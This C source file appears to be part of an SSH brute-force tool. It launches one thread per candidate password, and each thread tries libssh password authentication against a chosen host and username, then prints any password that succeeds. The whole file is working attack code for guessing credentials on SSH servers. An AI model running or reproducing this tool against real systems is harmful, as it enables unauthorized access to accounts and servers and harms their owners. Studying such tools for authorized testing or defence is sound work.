#include "ssh_brute.h"

#define gettid() syscall(SYS_gettid)

static void *connect_worker(void *arg)
{
	ssh_session session;
	struct ssh_brute_options *btop = arg;
	pid_t tid = gettid();
	int rc = 0;

	if (btop == NULL) {
		printf("Wrong argument for thread [%u]\n", tid);
		goto exit;
	}
	//printf("%s, %s, %s, %d\n", btop->password, btop->host, btop->username, btop->port); 

	session = ssh_new();
	if (!session) {
		printf("Cannot create session to [%s]", btop->host);
		goto exit;
	}

	ssh_options_set(session, SSH_OPTIONS_HOST, btop->host);
	ssh_options_set(session, SSH_OPTIONS_PORT, &btop->port);
	ssh_options_set(session, SSH_OPTIONS_USER, btop->username);

	rc = ssh_connect(session);
	if (rc != SSH_OK) {
		//printf("Cannot connect to host [%s] with user [%s] and password [%s]\n", btop->host, btop->username, btop->password);
		goto free_ssh;
	}

	rc = ssh_userauth_password(session, NULL, btop->password);
	if (rc == SSH_AUTH_SUCCESS) {
		pi_futex_wait(btop->futex_result);
		strncpy(btop->result, btop->password, strlen(btop->password));
		pi_futex_wake(btop->futex_result);
	}

	ssh_disconnect(session);
free_ssh:
	ssh_free(session);
exit:
	pi_futex_wake_many(btop->completed, btop->count);

	pthread_exit(NULL);
}

void *user_connection_thread(void *arg)
{
	struct ssh_username_options *uo = arg;
	struct ssh_brute_options *btop; 
	pthread_t *threads;
	int err = -1, tidx = 0, i;
	int completed_password = 0;
	char result[4096] = { 0 };

	if (!uo) {
		printf("[%s] wrong uo\n", __func__);
		goto exit;
	}

	threads = malloc(sizeof(pthread_t)*uo->pcount);
	if (!threads) {
		perror("Cannot allocate memory for threads\n");
		goto exit;
	}

	btop = malloc(sizeof(struct ssh_brute_options)*uo->pcount);
	if (!btop) {
		perror("Cannot alloc memory for ssh brute ops");
		goto free_threads;
	}

	for (tidx = 0; tidx < uo->pcount; tidx++) {

		btop[tidx].password = uo->passwords[tidx];
		btop[tidx].host = uo->host;
		btop[tidx].port = uo->port;
		btop[tidx].username = uo->username;
		btop[tidx].completed = &completed_password;
		btop[tidx].result = (char*)&result;
		btop[tidx].futex_result = uo->futex_result;
		btop[tidx].count = uo->pcount;

		err = pthread_create(&threads[tidx], 0, connect_worker, (void*)&btop[tidx]);
		if (err < 0) {
			printf("Error to create pthread [%d]\n", tidx);
			goto join_threads;
		}
	}

	err = 0;
	pi_futex_wait_many(&completed_password, uo->pcount);
join_threads:
	while (tidx) {
		pthread_join(threads[--tidx], NULL);
	}

	if (strlen(result) > 0) {
		printf("username -----> %s , password -----> %s\n", uo->username, result);
		memset(result, 0, 4096);
	}

	free(btop);
free_threads:
	free(threads);
exit:
	return NULL;
}
